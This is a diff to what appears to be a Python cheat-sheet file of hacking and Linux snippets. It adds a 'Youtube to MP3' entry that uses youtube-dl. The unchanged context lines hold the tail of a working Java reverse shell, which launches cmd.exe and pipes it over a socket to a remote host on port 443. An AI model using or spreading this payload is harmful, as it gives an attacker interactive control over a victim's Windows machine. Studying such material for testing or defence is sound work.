@@ -2136,3 +2136,15 @@ int port=443;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 """
+
+######################################
+######################################
+
+youtubeToMP3 = Cheat("Youtube to MP3")
+youtubeToMP3.category = "Linux"
+youtubeToMP3.subCategory = "Music"
+youtubeToMP3.output = """[*] Simple download music from a Youtube video
+
+sudo apt install youtube-dl
+youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IWy9mO-TjNw
+"""
